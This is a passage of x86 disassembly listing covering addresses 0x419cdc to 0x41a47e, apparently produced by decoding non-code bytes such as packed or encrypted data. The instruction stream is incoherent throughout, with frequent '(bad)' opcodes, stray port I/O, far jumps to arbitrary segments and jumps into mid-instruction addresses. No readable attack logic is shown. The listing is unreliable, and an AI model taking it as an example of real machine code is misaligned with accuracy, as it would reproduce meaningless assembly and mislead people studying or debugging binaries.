  419cdc:	sbb    DWORD PTR [ebp-0x5a],edi
  419cdf:	inc    ebp
  419ce0:	stc    
  419ce1:	imul   ecx,edx,0xc3c964b3
  419ce7:	ins    BYTE PTR es:[edi],dx
  419ce8:	or     al,0x86
  419cea:	int    0x70
  419cec:	jns    0x419c7e
  419cee:	out    0xff,al
  419cf0:	out    dx,eax
  419cf1:	jle    0x419cc4
  419cf3:	push   ds
  419cf4:	sbb    bl,BYTE PTR [esi]
  419cf6:	icebp  
  419cf7:	sbb    ebp,ecx
  419cf9:	(bad)  
  419cfa:	jmp    0x1fc1:0xd6eb306d
  419d01:	jne    0x419d15
  419d03:	lahf   
  419d04:	jnp    0x419d47
  419d06:	dec    edx
  419d07:	xchg   esi,eax
  419d08:	mov    ebp,0xe11500f7
  419d0d:	jmp    0x419d11
  419d0f:	mov    ebp,0xbe147a91
  419d14:	hlt    
  419d15:	jl     0x419c9b
  419d17:	add    esp,DWORD PTR [edx]
  419d19:	icebp  
  419d1a:	cmp    al,BYTE PTR [edi+0x5afef579]
  419d20:	adc    DWORD PTR [edx+0x424c9be],edx
  419d26:	sub    al,0x29
  419d28:	hlt    
  419d29:	arpl   bp,bp
  419d2b:	mov    ecx,0xfbd35534
  419d30:	out    dx,eax
  419d31:	mov    DWORD PTR [edx-0x7e],edi
  419d34:	mov    esp,0x247fa4d1
  419d39:	jmp    DWORD PTR [ebp+0x274410a6]
  419d3f:	rol    ebp,0xf7
  419d42:	pop    ebx
  419d43:	sub    BYTE PTR ss:[edi-0x7c],ch
  419d47:	in     eax,0xf3
  419d49:	jbe    0x419d21
  419d4b:	clc    
  419d4c:	out    0x3e,al
  419d4e:	ret    0xc031
  419d51:	dec    ebp
  419d52:	or     DWORD PTR [ecx-0x2e],0x57
  419d56:	inc    ecx
  419d57:	or     BYTE PTR [edi+esi*8],ch
  419d5a:	adc    DWORD PTR [edx+0x5abd6c1f],0xffffff84
  419d61:	fild   WORD PTR [ecx+eax*4-0x5cd5c900]
  419d68:	jo     0x419d2e
  419d6a:	jnp    0x419dab
  419d6c:	data16 mov al,ds:0x645252f8
  419d72:	push   eax
  419d73:	bound  eax,QWORD PTR ds:0x31c8c0bb
  419d79:	jecxz  0x419dd4
  419d7b:	or     BYTE PTR [eax-0x3f],0xe2
  419d7f:	sbb    edx,edi
  419d81:	ret    0x2169
  419d84:	je     0x419d5b
  419d86:	aam    0x3b
  419d88:	jae    0x419ddc
  419d8a:	dec    ebp
  419d8b:	jbe    0x419dc1
  419d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8e:	pusha  
  419d8f:	mov    BYTE PTR [esi-0x25],dh
  419d92:	enter  0x110b,0xa9
  419d96:	scas   al,BYTE PTR es:[edi]
  419d97:	adc    BYTE PTR [ebp+eiz*2-0x13],dh
  419d9b:	dec    edx
  419d9c:	cmc    
  419d9d:	shl    BYTE PTR [eax+0x3321ee96],1
  419da3:	inc    esi
  419da4:	ss pop es
  419da6:	pop    edi
  419da7:	sub    bh,BYTE PTR [edx+0x5272ee09]
  419dad:	and    ebp,DWORD PTR [ebx-0x54991d0]
  419db3:	mov    BYTE PTR [edx-0x46],bl
  419db6:	xchg   edi,eax
  419db7:	cdq    
  419db8:	cmp    al,0xb4
  419dba:	mov    eax,ds:0xb6e1e5c3
  419dbf:	(bad)  
  419dc0:	jp     0x419d7a
  419dc2:	xchg   esp,eax
  419dc3:	cmp    eax,ebp
  419dc5:	and    DWORD PTR ds:0xd49b5851,esp
  419dcb:	outs   dx,BYTE PTR ds:[esi]
  419dcc:	test   eax,0x5770c4d7
  419dd1:	jae    0x419dff
  419dd3:	cmc    
  419dd4:	push   edi
  419dd5:	in     eax,0x2b
  419dd7:	call   0x75a0212a
  419ddc:	rcl    BYTE PTR [ebx+esi*4],0x5a
  419de0:	jno    0x419e21
  419de2:	mov    al,BYTE PTR [esi]
  419de4:	sub    ah,dl
  419de6:	ret    
  419de7:	push   cs
  419de8:	aaa    
  419de9:	rcr    ch,0x6d
  419dec:	inc    ebp
  419ded:	dec    esi
  419dee:	or     edx,esp
  419df0:	sti    
  419df1:	dec    edx
  419df2:	in     eax,0x7a
  419df4:	push   es
  419df5:	or     ebx,DWORD PTR [edx-0x42]
  419df8:	push   eax
  419df9:	xchg   ebx,eax
  419dfa:	lods   al,BYTE PTR ds:[esi]
  419dfb:	jmp    0xdc1666be
  419e00:	xor    al,0xc6
  419e02:	push   DWORD PTR [ebp+0x447fe3f3]
  419e08:	mov    edx,0x7f321e4e
  419e0d:	lea    esp,[esi+0x3d]
  419e10:	push   ds
  419e11:	imul   ebp,edi,0xffffff80
  419e14:	sbb    edi,DWORD PTR [ecx-0x6a]
  419e17:	jbe    0x419e30
  419e19:	data16 mov ah,0xf3
  419e1c:	scas   eax,DWORD PTR es:[edi]
  419e1d:	repnz cdq 
  419e1f:	fcomp  QWORD PTR [eax-0x74]
  419e22:	or     edi,esp
  419e24:	fdivr  DWORD PTR [ecx]
  419e26:	inc    ecx
  419e27:	jp     0x419e8a
  419e29:	daa    
  419e2a:	pusha  
  419e2b:	pop    edx
  419e2c:	mov    ebx,0xb2ce6d41
  419e31:	stc    
  419e32:	adc    al,BYTE PTR [esi-0x3fa6dafb]
  419e38:	inc    esp
  419e39:	xchg   ebp,eax
  419e3a:	mov    WORD PTR [ebp-0x5d],?
  419e3d:	(bad)  
  419e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e3f:	and    esp,DWORD PTR ds:0x3056a1da
  419e45:	cmp    DWORD PTR [esi-0x6020943b],ecx
  419e4b:	jbe    0x419ea9
  419e4d:	fdiv   DWORD PTR [eax+0x2d]
  419e50:	ins    BYTE PTR es:[edi],dx
  419e51:	cmp    eax,0xe1a2ddae
  419e56:	(bad)  
  419e57:	(bad)  
  419e58:	clc    
  419e59:	iret   
  419e5a:	jne    0x419ed4
  419e5c:	rcl    BYTE PTR [edx+ecx*2+0xb4d9baf],cl
  419e63:	push   ebp
  419e64:	data16 jno 0x419e35
  419e67:	out    dx,eax
  419e68:	adc    al,0xb1
  419e6a:	dec    esi
  419e6b:	addr16 das 
  419e6d:	imul   esi,esi,0x224eb71a
  419e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e74:	jb     0x419e75
  419e76:	in     al,dx
  419e77:	sub    BYTE PTR [edi-0x74],ch
  419e7a:	cld    
  419e7b:	stos   BYTE PTR es:[edi],al
  419e7c:	xor    al,bl
  419e7e:	rol    edx,1
  419e80:	outs   dx,BYTE PTR ds:[esi]
  419e81:	jl     0x419e94
  419e83:	sbb    BYTE PTR [ebx+ebx*2-0x18],ah
  419e87:	and    bl,BYTE PTR [edi+0x2f305432]
  419e8d:	sub    eax,DWORD PTR [ebp+edi*1+0x12]
  419e91:	das    
  419e92:	add    eax,0xbea58716
  419e97:	push   ebp
  419e98:	loope  0x419ed4
  419e9a:	and    eax,0xeb8b8b0b
  419e9f:	inc    edi
  419ea0:	ficomp WORD PTR [ebx+edx*4-0x20]
  419ea4:	sahf   
  419ea5:	sub    DWORD PTR [esi-0x28],esp
  419ea8:	mov    dl,BYTE PTR [esi-0x72]
  419eab:	add    DWORD PTR [esi+esi*2],esp
  419eae:	sub    eax,DWORD PTR [edi+eax*8-0x9]
  419eb2:	pop    esp
  419eb3:	ret    0x44ae
  419eb6:	jmp    0xe67f:0x9fcea244
  419ebd:	idiv   ebx
  419ebf:	mov    ah,0x6e
  419ec1:	aas    
  419ec2:	sbb    al,0x93
  419ec4:	jmp    0x419eb0
  419ec6:	pushf  
  419ec7:	push   es
  419ec8:	nop
  419ec9:	in     al,0x0
  419ecb:	adc    ebp,DWORD PTR [edi+edi*2-0x7]
  419ecf:	bound  edi,QWORD PTR [edx+0x65]
  419ed2:	push   es
  419ed3:	inc    ebx
  419ed4:	ficomp DWORD PTR [ebx]
  419ed6:	or     BYTE PTR [edx+0x4c9531e0],ah
  419edc:	bound  esp,QWORD PTR [eax+edx*2]
  419edf:	add    DWORD PTR [ecx+edi*1],0x2b
  419ee3:	or     edi,0x4ff0090b
  419ee9:	mov    ah,0x72
  419eeb:	call   0xb7f8:0xf806eebe
  419ef2:	xor    eax,0x6a20b309
  419ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef8:	jge    0x419f74
  419efa:	ins    BYTE PTR es:[edi],dx
  419efb:	mov    al,ds:0xeb8e7e9c
  419f00:	in     al,0xc4
  419f02:	pop    ebx
  419f03:	test   al,0x5
  419f05:	jp     0x419f24
  419f07:	popa   
  419f08:	adc    BYTE PTR [ecx-0x15cfc84b],cl
  419f0e:	imul   eax,DWORD PTR [eax],0xebfaf385
  419f14:	je     0x419edd
  419f16:	imul   ecx,ecx,0x1c93aaaa
  419f1c:	cmp    DWORD PTR [eax-0x4a1dff47],ecx
  419f22:	loop   0x419ec7
  419f24:	loopne 0x419f3b
  419f26:	out    dx,al
  419f27:	push   esp
  419f28:	fcmovne st,st(4)
  419f2a:	push   0x4
  419f2c:	pop    eax
  419f2d:	sti    
  419f2e:	push   0xffffffc5
  419f30:	lahf   
  419f31:	mov    ebx,0x10a2dc51
  419f36:	dec    edi
  419f37:	inc    ecx
  419f38:	out    0x1d,al
  419f3a:	inc    esp
  419f3b:	mov    bh,0x47
  419f3d:	mov    dh,0x92
  419f3f:	add    ah,bh
  419f41:	mov    BYTE PTR [ebp-0x65],ah
  419f44:	dec    edx
  419f45:	sbb    DWORD PTR [si-0xf],eax
  419f49:	cmp    bh,BYTE PTR [ecx]
  419f4b:	clc    
  419f4c:	adc    DWORD PTR [edi-0x57f5a1ba],esp
  419f52:	jnp    0x6891a177
  419f58:	je     0x419f3c
  419f5a:	cmovne edi,DWORD PTR [ecx+0x45]
  419f5e:	inc    esi
  419f5f:	imul   ebp,DWORD PTR [esi+eax*2],0x50
  419f63:	pop    esi
  419f64:	push   es
  419f65:	adc    edi,DWORD PTR [ebp+0x47d554c0]
  419f6b:	mov    bh,BYTE PTR [ecx+eiz*4+0x75d6d282]
  419f72:	lea    eax,[ebp-0x60]
  419f75:	call   ebp
  419f77:	repz mov ch,0x9
  419f7a:	or     al,0x3f
  419f7d:	push   ebx
  419f7e:	cwde   
  419f7f:	out    0xf8,eax
  419f81:	leave  
  419f82:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419f84:	jne    0x419f7b
  419f86:	stc    
  419f87:	cld    
  419f88:	mov    edi,0x769e039e
  419f8d:	fiadd  WORD PTR [ebx+0x3e]
  419f90:	out    0x0,eax
  419f92:	xor    ecx,eax
  419f94:	jno    0x419fe7
  419f96:	pushf  
  419f97:	pop    ecx
  419f98:	mov    dh,0x12
  419f9a:	lahf   
  419f9b:	dec    edi
  419f9c:	push   ebx
  419f9d:	imul   ebx,ebx,0xb8983542
  419fa3:	or     bh,BYTE PTR [edi+0x3d]
  419fa6:	in     eax,0xa9
  419fa8:	xor    eax,0xb32c6047
  419fad:	jecxz  0x419fc8
  419faf:	(bad)  
  419fb0:	cdq    
  419fb1:	test   DWORD PTR [esi],0x5acb2f70
  419fb7:	iret   
  419fb8:	sti    
  419fb9:	push   edx
  419fba:	jecxz  0x419fb2
  419fbc:	jle    0x419fe4
  419fbe:	out    0xbd,al
  419fc0:	xor    bl,BYTE PTR [ebp+esi*4-0x76c8c3fe]
  419fc7:	jmp    0x8c19579a
  419fcc:	sub    edi,edi
  419fce:	jb     0x41a04d
  419fd0:	retf   
  419fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd2:	shl    dl,0xbb
  419fd5:	jl     0x419fcf
  419fd7:	adc    BYTE PTR [esi],al
  419fd9:	es daa 
  419fdb:	or     esi,ebp
  419fdd:	fwait
  419fde:	adc    BYTE PTR [ecx],dh
  419fe0:	js     0x41a022
  419fe2:	mov    eax,0xe586349a
  419fe7:	sub    dl,dl
  419fe9:	int3   
  419fea:	call   0x7244:0xb5e2a2e8
  419ff1:	addr16 cmp ebp,ecx
  419ff4:	dec    edx
  419ff5:	out    dx,al
  419ff6:	mov    eax,0xe85f5e9
  419ffb:	das    
  419ffc:	js     0x419fe0
  419ffe:	adc    eax,0x457e5eb2
  41a003:	ja     0x41a03f
  41a005:	cmp    bl,BYTE PTR [edx]
  41a007:	mov    al,0xc0
  41a009:	add    eax,0xdd1d1b26
  41a00e:	mov    esi,0x92abf634
  41a013:	push   0x5
  41a015:	inc    edx
  41a016:	mov    ds:0xd20a72a2,al
  41a01b:	scas   eax,DWORD PTR es:[edi]
  41a01c:	rcl    DWORD PTR [edx],1
  41a01e:	daa    
  41a01f:	cs cwde 
  41a021:	add    ch,BYTE PTR [esi+0x54]
  41a024:	or     DWORD PTR [edx+0x34],0xaddf5cb5
  41a02b:	add    dh,BYTE PTR [edx-0x71]
  41a02e:	sbb    al,dh
  41a030:	inc    ecx
  41a031:	cmp    BYTE PTR [eax+0x69d7a695],0x80
  41a038:	pop    esp
  41a039:	add    BYTE PTR [edi],bl
  41a03b:	adc    DWORD PTR [esi+0x6b],edi
  41a03e:	mov    bl,0xd1
  41a040:	call   0xb7d49a2b
  41a045:	in     eax,dx
  41a046:	dec    esp
  41a047:	jno    0x41a0ac
  41a049:	mov    cl,0xb6
  41a04b:	fs ss jb 0x41a036
  41a04f:	push   ds
  41a050:	sub    dl,cl
  41a052:	mov    ecx,0xd70fd84a
  41a057:	sbb    bl,BYTE PTR [ebp+0x40]
  41a05a:	xchg   ebx,eax
  41a05b:	xchg   edx,eax
  41a05c:	call   FWORD PTR [ecx+0x7fc3786b]
  41a062:	pop    edx
  41a063:	stos   BYTE PTR es:[edi],al
  41a064:	inc    edx
  41a065:	dec    ecx
  41a066:	push   ebp
  41a067:	jmp    0xbb7d:0xba1603c4
  41a06e:	xchg   ebp,eax
  41a06f:	push   esi
  41a070:	inc    ebx
  41a071:	add    edx,edi
  41a073:	inc    esi
  41a074:	or     al,0xfd
  41a076:	xor    BYTE PTR [edi-0x5b],al
  41a079:	cmp    al,0xed
  41a07b:	inc    esp
  41a07c:	out    dx,al
  41a07d:	cmp    ebp,DWORD PTR [esi]
  41a07f:	push   esi
  41a080:	int    0xa7
  41a082:	inc    eax
  41a083:	outs   dx,DWORD PTR ds:[esi]
  41a084:	(bad)  
  41a085:	or     dh,BYTE PTR es:[esi+esi*8+0x3bdef7fa]
  41a08d:	sub    DWORD PTR [ebp-0x6b880f25],0x14
  41a094:	(bad)
  41a098:	push   0x7564f8e3
  41a09d:	in     eax,dx
  41a09e:	sbb    al,BYTE PTR [edi-0x78034378]
  41a0a4:	pop    ecx
  41a0a5:	mov    dh,0xb3
  41a0a7:	xchg   ebx,eax
  41a0a8:	out    dx,al
  41a0a9:	fwait
  41a0aa:	mov    edx,0x6da4f2b7
  41a0af:	mov    cl,0x23
  41a0b1:	jecxz  0x41a058
  41a0b3:	dec    edx
  41a0b4:	test   al,0xf9
  41a0b6:	mov    BYTE PTR [ecx],al
  41a0b8:	in     al,0xce
  41a0ba:	or     edx,ebx
  41a0bc:	imul   ebp,DWORD PTR [esi+0x4b5265d5],0xffffffe3
  41a0c3:	adc    eax,DWORD PTR [edx+0x59e8adc4]
  41a0c9:	sub    DWORD PTR [esi],0x77fbb212
  41a0cf:	sub    BYTE PTR [ecx],0xd2
  41a0d2:	jg     0x41a123
  41a0d4:	add    DWORD PTR [ecx],edi
  41a0d6:	jbe    0x41a0a1
  41a0d8:	push   esp
  41a0d9:	push   es
  41a0da:	(bad)  
  41a0dc:	outs   dx,DWORD PTR ds:[esi]
  41a0dd:	aam    0x2
  41a0df:	imul   esi,DWORD PTR [eax+eiz*8],0xffffff81
  41a0e3:	out    0x9e,al
  41a0e5:	es nop
  41a0e7:	(bad)  
  41a0e9:	mov    al,ds:0x6c50c5fc
  41a0ee:	daa    
  41a0ef:	popa   
  41a0f0:	mov    edx,0xf5c86bb6
  41a0f5:	aaa    
  41a0f6:	aaa    
  41a0f7:	in     eax,0xa3
  41a0f9:	aaa    
  41a0fa:	gs (bad) 
  41a0fc:	mov    esi,0xc49c45b
  41a101:	sbb    DWORD PTR [ecx],esi
  41a103:	jne    0x41a0a3
  41a105:	aaa    
  41a106:	and    edx,DWORD PTR [ecx-0x43]
  41a109:	pop    esp
  41a10a:	fidivr WORD PTR [esi]
  41a10c:	mov    ah,0x65
  41a10e:	pop    esp
  41a10f:	inc    edi
  41a110:	mov    edx,0xd76bfdcd
  41a115:	ins    DWORD PTR es:[edi],dx
  41a116:	int    0x7d
  41a118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a119:	mov    esp,0x8f5537c8
  41a11e:	jnp    0x41a172
  41a120:	(bad)  
  41a121:	in     al,0x30
  41a123:	rcr    BYTE PTR [ebx+0x3b],1
  41a126:	pop    edx
  41a127:	(bad)  
  41a128:	arpl   WORD PTR [ebx-0x24],dx
  41a12b:	mov    ebx,0xb6bf34d0
  41a130:	ja     0x41a1a0
  41a132:	and    dl,BYTE PTR [ebx+0x3c]
  41a135:	cmp    DWORD PTR [edx+0x7],edi
  41a138:	mov    esp,DWORD PTR [eax]
  41a13a:	jb     0x41a128
  41a13c:	sbb    DWORD PTR [edx*8+0x501b2cff],ebx
  41a143:	int    0x70
  41a145:	popa   
  41a146:	pop    esp
  41a147:	cmp    esi,DWORD PTR [esi-0x45]
  41a14a:	mov    dh,0x90
  41a14c:	test   al,0xbe
  41a14e:	jno    0x41a0d1
  41a150:	xor    dl,BYTE PTR [ecx]
  41a152:	daa    
  41a153:	fld    QWORD PTR [ebx-0x560212d9]
  41a159:	adc    eax,DWORD PTR [edi-0x110d34fc]
  41a15f:	pop    ds
  41a160:	sub    edx,DWORD PTR [edi-0x1b341eb8]
  41a166:	loopne 0x41a1b5
  41a168:	push   ds
  41a169:	push   esi
  41a16a:	xchg   ebp,edi
  41a16c:	pop    es
  41a16d:	outs   dx,DWORD PTR ds:[esi]
  41a16e:	dec    edi
  41a16f:	jnp    0x41a1aa
  41a171:	push   ebx
  41a172:	fild   QWORD PTR [ebp-0x6e40c037]
  41a178:	pop    ebp
  41a179:	in     al,dx
  41a17a:	push   ebx
  41a17b:	sbb    BYTE PTR [ecx],0x9
  41a17e:	push   esi
  41a17f:	fadd   QWORD PTR [ebx+0x280de697]
  41a185:	pop    esi
  41a186:	daa    
  41a187:	or     ch,ch
  41a189:	clc    
  41a18a:	lahf   
  41a18b:	mov    eax,ds:0xb5f72917
  41a190:	ins    DWORD PTR es:[edi],dx
  41a191:	sbb    edi,ebx
  41a193:	push   ss
  41a194:	call   0x5cfd:0x4bb176e6
  41a19b:	fcom   QWORD PTR [ecx-0x36]
  41a19e:	popf   
  41a19f:	mov    ebx,DWORD PTR [esi+0x15bf13e7]
  41a1a5:	repz ffreep st(1)
  41a1a8:	mov    esi,0xe57a867d
  41a1ad:	repz jmp 0x41a176
  41a1b0:	ins    DWORD PTR es:[edi],dx
  41a1b1:	xchg   ecx,eax
  41a1b2:	sub    al,0x0
  41a1b4:	jle    0x41a1ac
  41a1b6:	fisubr DWORD PTR [edi+0x62d2bcc8]
  41a1bc:	jg     0x41a1a1
  41a1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1bf:	xor    al,0x75
  41a1c1:	fld    QWORD PTR [esp+edx*1-0x2a]
  41a1c5:	out    dx,eax
  41a1c6:	adc    al,0x97
  41a1c8:	dec    edx
  41a1c9:	fsub   st(3),st
  41a1cb:	xor    BYTE PTR ds:0x33977e2,ch
  41a1d1:	shl    BYTE PTR [esi],0xde
  41a1d4:	out    dx,al
  41a1d5:	xlat   BYTE PTR ds:[ebx]
  41a1d6:	ja     0x41a209
  41a1d8:	inc    edi
  41a1d9:	and    eax,0xa905c08f
  41a1de:	mov    esp,0x6716a8fc
  41a1e3:	mov    cl,0xf9
  41a1e5:	test   DWORD PTR [ecx-0x2ad039c3],esp
  41a1eb:	xchg   esp,eax
  41a1ec:	push   es
  41a1ed:	(bad)  
  41a1ee:	mov    cs,WORD PTR [ecx]
  41a1f0:	dec    DWORD PTR [ecx-0x4e9ff01f]
  41a1f6:	neg    BYTE PTR [ecx+ecx*4+0x6d]
  41a1fa:	cwde   
  41a1fb:	repnz and bl,ch
  41a1fe:	retf   0xe560
  41a201:	xor    DWORD PTR [ecx-0xc],esp
  41a204:	mov    WORD PTR [esi-0x404a0f08],ds
  41a20a:	jmp    0x9af1:0x4485145
  41a211:	cmp    al,0xa6
  41a213:	fwait
  41a214:	jb     0x41a290
  41a216:	adc    esi,eax
  41a218:	or     al,0x46
  41a21a:	adc    BYTE PTR [ebx-0x22524986],ah
  41a220:	loope  0x41a1bd
  41a222:	outs   dx,BYTE PTR ds:[esi]
  41a223:	arpl   WORD PTR [edx+esi*4-0x1c],si
  41a227:	sti    
  41a228:	push   es
  41a229:	mov    ebx,0xc080cf88
  41a22e:	or     al,0xf0
  41a230:	push   es
  41a231:	push   ebp
  41a232:	rol    DWORD PTR [esi],1
  41a234:	sbb    esp,edi
  41a236:	mov    al,ds:0x56c7fbb8
  41a23b:	shl    DWORD PTR ss:0x2e4d0f24,cl
  41a242:	addr16 mov eax,0x5b004bfd
  41a248:	(bad)  
  41a249:	mov    ds:0xae256ef,al
  41a24e:	fnsave [ebx-0x3f]
  41a251:	inc    esp
  41a252:	outs   dx,DWORD PTR ds:[esi]
  41a253:	inc    eax
  41a254:	push   esp
  41a255:	pop    eax
  41a256:	inc    ecx
  41a257:	adc    al,0x92
  41a259:	scas   al,BYTE PTR es:[edi]
  41a25a:	pusha  
  41a25b:	and    BYTE PTR [edx-0x6f],ah
  41a25e:	loope  0x41a26d
  41a260:	pop    ss
  41a261:	(bad)
  41a264:	bound  esp,QWORD PTR [edi]
  41a266:	mov    ch,0x82
  41a268:	cmp    DWORD PTR [edx-0x29],0xffffffd3
  41a26c:	pop    edx
  41a26d:	push   ecx
  41a26e:	jo     0x41a230
  41a270:	retf   0x3086
  41a273:	stc    
  41a274:	cwde   
  41a275:	lods   eax,DWORD PTR ds:[esi]
  41a276:	mov    WORD PTR [edx],?
  41a278:	jl     0x41a20b
  41a27a:	mov    al,0x33
  41a27c:	add    al,0xbf
  41a27e:	pop    esp
  41a27f:	loop   0x41a2f7
  41a281:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41a283:	iret   
  41a284:	or     BYTE PTR [edi-0x35],cl
  41a287:	std    
  41a288:	cld    
  41a289:	push   eax
  41a28a:	call   0x699b:0x3311de4a
  41a291:	loop   0x41a2a2
  41a293:	(bad)
  41a297:	add    DWORD PTR [esi+eax*2-0x33208d5b],edx
  41a29e:	xor    dl,dl
  41a2a0:	jl     0x41a273
  41a2a2:	aaa    
  41a2a3:	push   edi
  41a2a4:	push   0x91b4b70f
  41a2a9:	scas   al,BYTE PTR es:[edi]
  41a2aa:	push   ds
  41a2ab:	add    ebx,edi
  41a2ad:	lock push esi
  41a2af:	dec    edi
  41a2b0:	(bad)
  41a2b3:	into   
  41a2b4:	sub    bh,cl
  41a2b6:	push   ecx
  41a2b7:	or     DWORD PTR [edi+0x72df77bf],eax
  41a2bd:	lods   al,BYTE PTR ds:[esi]
  41a2be:	fcmovnb st,st(7)
  41a2c0:	inc    ecx
  41a2c1:	aaa    
  41a2c2:	jae    0x41a2b4
  41a2c4:	push   ds
  41a2c5:	mov    BYTE PTR [edi+0x56046f9d],dl
  41a2cb:	sub    DWORD PTR [ebp+edx*2-0x43],0xffffffaa
  41a2d0:	call   0x286d:0x64395d93
  41a2d7:	and    esp,DWORD PTR [ebx+0x5e07a57f]
  41a2dd:	cwde   
  41a2de:	xor    ah,dl
  41a2e0:	mov    al,0x93
  41a2e2:	adc    al,0x2e
  41a2e4:	inc    ebp
  41a2e5:	mov    edi,0xc45fe8f6
  41a2ea:	stc    
  41a2eb:	xchg   esi,eax
  41a2ec:	or     eax,0xf6b7a595
  41a2f1:	fisttp WORD PTR [ecx+0x79c70195]
  41a2f7:	dec    ebx
  41a2f8:	or     cl,BYTE PTR [edx+0x30]
  41a2fb:	ds push edi
  41a2fd:	mov    ch,0x59
  41a2ff:	jle    0x41a35c
  41a301:	pop    eax
  41a302:	mov    bl,0x9e
  41a304:	imul   esp,edx,0xabd60655
  41a30a:	mov    WORD PTR [edi],ss
  41a30c:	dec    edx
  41a30d:	test   dh,bh
  41a30f:	shl    ebx,1
  41a311:	int    0xda
  41a313:	mov    bl,0x89
  41a315:	lds    edi,FWORD PTR [esi+0x67]
  41a318:	jbe    0x41a2ea
  41a31a:	dec    esi
  41a31b:	mov    ebp,0x9a32e788
  41a320:	fbstp  TBYTE PTR [ebx-0x2e]
  41a323:	xlat   BYTE PTR ds:[ebx]
  41a324:	fisubr WORD PTR [ecx-0x114340b7]
  41a32a:	adc    eax,0x9c4db9d4
  41a32f:	mov    ecx,0x79862cba
  41a334:	(bad)  
  41a335:	ss cdq 
  41a337:	idiv   BYTE PTR [esp+edi*1+0x33]
  41a33b:	(bad)  
  41a33c:	mov    eax,0xc1e536d2
  41a341:	push   edx
  41a342:	retf   0x3671
  41a345:	lahf   
  41a346:	inc    eax
  41a347:	pop    esi
  41a348:	call   0x3c50:0x20ec1992
  41a34f:	xchg   DWORD PTR [ebx],esi
  41a351:	jge    0x41a3c5
  41a353:	adc    ch,BYTE PTR [esi-0x374d3054]
  41a359:	jnp    0x41a38c
  41a35b:	cs jae 0x41a3d7
  41a35e:	and    eax,0x2f56e1ba
  41a363:	add    BYTE PTR [ecx+0x44],bh
  41a366:	cdq    
  41a367:	mov    ebp,0xfa67fa70
  41a36c:	ja     0x41a31d
  41a36e:	and    BYTE PTR [esi-0x2e],0xd3
  41a372:	out    0x9b,eax
  41a374:	mov    eax,ds:0x61d62875
  41a379:	add    edx,DWORD PTR [eax]
  41a37b:	fst    DWORD PTR [eax+0x32d1e52f]
  41a381:	call   0x5b7b:0x9f79ea6b
  41a388:	das    
  41a389:	push   eax
  41a38a:	inc    ebx
  41a38b:	dec    esp
  41a38c:	test   edi,edi
  41a38e:	fsubr  st,st(4)
  41a390:	cmp    al,0xef
  41a392:	jno    0x41a3f3
  41a394:	push   0xae145d1e
  41a399:	fldcw  WORD PTR [edx]
  41a39b:	outs   dx,BYTE PTR ds:[esi]
  41a39c:	aad    0xb7
  41a39e:	pusha  
  41a39f:	cmp    eax,0x8701b28f
  41a3a4:	mov    bh,0xef
  41a3a6:	paddw  mm0,QWORD PTR [esp-0x1]
  41a3ab:	adc    ebp,DWORD PTR [esi-0x6]
  41a3ae:	dec    eax
  41a3af:	cwde   
  41a3b0:	mov    edi,0xc98d1ff8
  41a3b5:	cmovns edx,DWORD PTR [esi+0x19827a75]
  41a3bc:	test   eax,0x3e584f17
  41a3c1:	enter  0x18cf,0x8a
  41a3c5:	iret   
  41a3c6:	das    
  41a3c7:	jbe    0x41a3e8
  41a3c9:	xor    cl,BYTE PTR [edx-0x1]
  41a3cc:	and    DWORD PTR [edx+eiz*1+0x6fa349c],edx
  41a3d3:	adc    BYTE PTR [eax],bh
  41a3d5:	mov    al,ds:0x9283f34e
  41a3da:	mov    cl,0x93
  41a3dc:	lds    ebp,FWORD PTR [ebp+0x32654c15]
  41a3e2:	bound  esp,QWORD PTR [ebx+0x7c]
  41a3e5:	call   0xa41370e2
  41a3ea:	add    DWORD PTR [edi+0x4e],0x9fa10350
  41a3f1:	fdivr  st,st(7)
  41a3f3:	sub    al,0xa0
  41a3f5:	add    dh,BYTE PTR [esp+edi*8+0x6d]
  41a3f9:	xchg   esp,eax
  41a3fa:	imul   BYTE PTR [edi+0x24d3d751]
  41a400:	xchg   esp,eax
  41a401:	(bad)  [ebx]
  41a403:	cmp    dh,dl
  41a405:	xchg   DWORD PTR [ebx-0x53f7333],ebx
  41a40b:	mov    eax,ds:0x88467b27
  41a410:	cmp    dl,BYTE PTR [edx+0x686c42f9]
  41a416:	cmp    eax,0xdf4cc8c7
  41a41b:	xchg   ecx,eax
  41a41c:	fst    QWORD PTR [ecx-0x12]
  41a41f:	jae    0x41a466
  41a421:	in     eax,0x2f
  41a423:	cli    
  41a424:	scas   eax,DWORD PTR es:[edi]
  41a425:	iret   
  41a426:	lds    eax,FWORD PTR [esi+0x2d294c92]
  41a42c:	inc    eax
  41a42d:	inc    ebx
  41a42e:	sbb    eax,0x278cafbe
  41a433:	inc    esi
  41a434:	arpl   WORD PTR [ebx-0x43a2bd34],cx
  41a43a:	outs   dx,BYTE PTR ds:[esi]
  41a43b:	and    ecx,ebp
  41a43d:	push   esi
  41a43f:	mov    bl,0x4e
  41a441:	xchg   ecx,eax
  41a442:	push   esi
  41a443:	jne    0x41a47e
  41a445:	jg     0x41a3e1
  41a447:	mov    eax,0xf2bd10d8
  41a44c:	lock mov ebx,0xd1fdbe4a
  41a452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a453:	sbb    DWORD PTR [eax+0x3d],eax
  41a456:	pop    ebp
  41a457:	add    dl,0xf8
  41a45a:	jecxz  0x41a477
  41a45c:	aaa    
  41a45d:	dec    ecx
  41a45e:	pop    esp
  41a45f:	push   ebp
  41a460:	inc    esp
  41a461:	fstp   QWORD PTR [esp+eiz*4+0x8]
  41a465:	pushf  
  41a466:	inc    ebp
  41a467:	inc    esi
  41a468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a469:	pop    ss
  41a46a:	mov    bh,0xac
  41a46c:	stc    
  41a46d:	and    al,0x7a
  41a46f:	jge    0x41a4a8
  41a471:	sbb    edi,DWORD PTR [ebx+0x33]
  41a474:	mov    esi,0x24979fb4
  41a479:	rcl    BYTE PTR [eax+eiz*8],cl
  41a47c:	out    dx,eax
  41a47d:	outs   dx,BYTE PTR ds:[esi]
  41a47e:	call   0xebba:0x6554771b
